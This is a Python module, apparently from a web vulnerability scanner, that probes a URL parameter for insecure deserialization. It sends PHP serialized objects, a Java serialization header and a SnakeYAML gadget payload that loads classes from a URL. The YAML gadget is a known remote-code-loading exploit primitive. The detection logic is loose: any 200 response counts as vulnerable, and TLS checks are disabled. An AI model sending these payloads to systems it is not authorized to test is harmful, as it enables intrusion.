import re
from typing import Optional, Dict
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url

logger = get_logger("deserialization_detector")

DESER_PATTERNS = [
    r'(?i)(java\.io\.Serializable|ObjectInputStream|readObject)',
    r'(?i)(yaml|snakeyaml|Yaml\.load)',
    r'(?i)(pickle|cPickle|__reduce__|__getstate__)',
    r'(?i)(php:\/\/|unserialize|O:\d+:"|s:\d+:")',
    r'(?i)(XMLDecoder|java\.beans\.XMLDecoder)',
    r'(?i)(Jackson|@JacksonInject|@JsonTypeInfo)',
    r'(?i)(FastJson|JSON\.parseObject|@JSONType)',
    r'(?i)(XStream|com\.thoughtworks\.xstream)',
]

PHP_ERROR_PATTERNS = [
    r'PHP Fatal error',
    r'unserialize\(\)',
    r'__PHP_Incomplete_Class',
    r'class name must be a valid object',
]

JAVA_ERROR_PATTERNS = [
    r'java\.io\.(StreamCorruptedException|InvalidClassException)',
    r'com\.sun\.org\.apache\.xml',
    r'javax\.xml\.bind',
    r'org\.apache\.commons',
]

PHP_UNSERIALIZE_PAYLOADS = [
    'O:7:"stdClass":0:{}',
    'a:1:{i:0;s:4:"test";}',
    'O:8:"stdClass":2:{s:4:"test";s:4:"test";}',
]

JAVA_SERIALIZED_MAGIC = "rO0ABQ=="


def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
          timeout: float = 10.0) -> Dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": []}

    if url:
        try:
            r = sess.get(url, timeout=timeout, verify=False)
            for pat in DESER_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "source_code_leak"
                    result["evidence"].append("deser pattern: %s" % pat[:30])
                    break
        except Exception as e:
            logger.debug("deser scan: %s", e)

    if param and not result["vulnerable"]:
        for payload in PHP_UNSERIALIZE_PAYLOADS:
            try:
                r = sess.get(build_url(url, param, payload),
                             timeout=timeout, verify=False)
                for pat in PHP_ERROR_PATTERNS + JAVA_ERROR_PATTERNS:
                    if re.search(pat, r.text, re.IGNORECASE):
                        result["vulnerable"] = True
                        result["type"] = "php_unserialize"
                        result["evidence"].append("php unserialize error: %s" % payload[:20])
                        break
                if r.status_code == 200 and r.text and "stdClass" in r.text:
                    result["vulnerable"] = True
                    result["type"] = "php_unserialize"
                    result["evidence"].append("php unserialize: object reflected in response")
                    break
            except Exception as e:
                logger.debug("deser php %s: %s", payload[:15], e)
            if result["vulnerable"]:
                break

    if param and not result["vulnerable"]:
        try:
            r = sess.get(build_url(url, param, JAVA_SERIALIZED_MAGIC),
                         timeout=timeout, verify=False)
            for pat in JAVA_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "java_serialized"
                    result["evidence"].append("java serialized error: %s" % pat[:30])
        except Exception as e:
            logger.debug("deser java: %s", e)

    yaml_payload = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://test/\"]]]]"
    if param and not result["vulnerable"]:
        try:
            r = sess.get(build_url(url, param, yaml_payload),
                         timeout=timeout, verify=False)
            if r.status_code == 200 and r.text:
                result["vulnerable"] = True
                result["type"] = "yaml_deser"
                result["evidence"].append("yaml payload accepted at %s?%s" % (url[:40], param))
        except Exception as e:
            logger.debug("deser yaml: %s", e)

    return result
